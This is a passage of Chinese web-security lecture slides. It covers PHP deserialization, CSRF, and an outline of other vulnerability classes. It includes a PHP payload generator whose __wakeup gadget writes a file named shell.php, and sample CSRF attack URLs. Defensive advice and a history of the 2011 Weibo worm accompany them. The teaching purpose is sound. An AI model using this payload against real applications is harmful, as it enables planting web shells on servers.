## 构造漏洞利用的关键负载

```php
<?php
class cuc {
    var $test = 'whatever';
    function __wakeup() {
        $fp = fopen("shell.php", "w");
        fwrite($fp, $this->test);
        fclose($fp);
        echo '__wakeup';
    }
}
$payload_class = new cuc();
$payload_class->test = "<?php phpinfo(); ?>";
$payload = serialize($payload_class);
print(urlencode($payload)); // urlencode() 结果是为了方便使用 curl 时给 GET 参数赋值
```

---

[![asciicast](https://asciinema.org/a/pME1z7OyEA12JrXT5dKlwgCQQ.svg)](https://asciinema.org/a/pME1z7OyEA12JrXT5dKlwgCQQ)

---

## 反序列化漏洞的防御方案

* 将应用程序配置为不接受不可信来源的任何反序列化输入
* 仅使用具有基本数据类型的序列化函数（如 PHP 的 json_encode() 和 json_decode()）
* 如果这些措施不可行，那么在创建对象之前执行反序列化期间应强制实施约束类型，在较低特权环境（例如，临时容器）中运行反序列化，并限制与执行反序列化的服务器的网络连接
* 同时还可通过使用加密或完整性检查（例如，数字签名），防止恶意的对象创建和数据篡改操作

# 9. 第三方组件缺陷 {id="vulnerable-component"}

---

# 后台相关漏洞

---

* SQL 注入漏洞
* 命令注入
* 服务端请求伪造

# 10. SQL 注入漏洞 {id="sqli"}

---

## 推荐训练学习资源 {id="sqli-labs"}

* [sqli-labs](https://github.com/c4pr1c3/sqli-labs) | [sqli-labs 国内 gitee 镜像](https://gitee.com/c4pr1c3/sqli-labs)

---

# 11. 命令注入 {id="command-injection"}

---

# 12. 服务端请求伪造 {id="ssrf"}

---

# 输出相关漏洞

---

* 跨站点脚本
* 信息泄露

# 13. 跨站点脚本 {id="xss"}

---

# 14. 信息泄露 {id="info-leakage"}

---

# 再看一个输入相关的有趣漏洞

---

# 15. CSRF 漏洞 {id="csrf"}

---

1. 利用站点已验证通过的用户会话（无需获取用户的登录凭证）

http://victim.org/addFriend.do?friend=attacker@gmail.com

2. 当一个已经登录 `victim.org` 的用户打开一个包含有 `XSS` 攻击代码的页面（或者通过一个隐藏的iframe），并且该 `XSS` 代码执行上述的 `URL` 请求，则该用户就会执行 `addFriend` 这个操作

3. 结果：用户在不知情的情况下添加了攻击者作为自己的好友

---

![添加后门账号](images/chap0x07/csrf-facebook-add-backdoor-account.mp4)

---

## CSRF 知名安全事件 {id="csrf-notorious-event"}

* 新浪微博 `2011 年 6 月 28 日` 晚间的大规模 `XSS+CSRF` 蠕虫事件
    * 事件时间线：16分钟
        * 20:14，开始有大量带V的认证用户中招转发蠕虫
        * 20:30，2kt.cn中的病毒页面无法访问
        * 20:32，新浪微博中hellosamy用户无法访问
        * 21:02，新浪漏洞修补完毕
    * 感染人数：32961人！
* 病毒作者使用的用户名 `hello-samy` 是为了向世界上第一个 `XSS+CSRF` 蠕虫作者 `samy` 致敬

---

## CSRF 描述 {id="csrf-description"}

* 从名称上来看类似跨站点攻击，但实质上完全不同：
    * XSS 是滥用用户对 Web 站点的信任
    * CSRF 是滥用 Web 站点对其授权用户的信任
* 伪装成来自受信任站点的合法用户
    * 有时也被称为会话劫持攻击
* 典型案例
    * 诱骗用户访问一个图片源标记为恶意请求链接的页面，从而触发一个异步的恶意远程调用
    * 接受受信任并且通过验证的用户的输入但并不检查数据的来源地址

---

## 与 XSS 的联系

* 跨站点请求伪造通常伴随 XSS 漏洞利用过程
* 先有 XSS，再有 CSRF
    * 借助 XSS 漏洞获得在用户浏览器执行脚本的机会
* 没有 XSS，一样可以有 CSRF
    * 借助已通过网站认证和获得授权的用户浏览器会话
        * 假借用户的合法cookie
* 一个URL即可触发一次CSRF
    * http://victim.org/deluser.php?id=admin

# 平台相关漏洞

---

* Web 服务器 URI 解析类漏洞
* 不当配置缺陷

---


# 16. Web 服务器 URI 解析类漏洞 {id="web-svr-uri-parse-vul"}


---


# 17. 不当配置缺陷 {id="cce"}


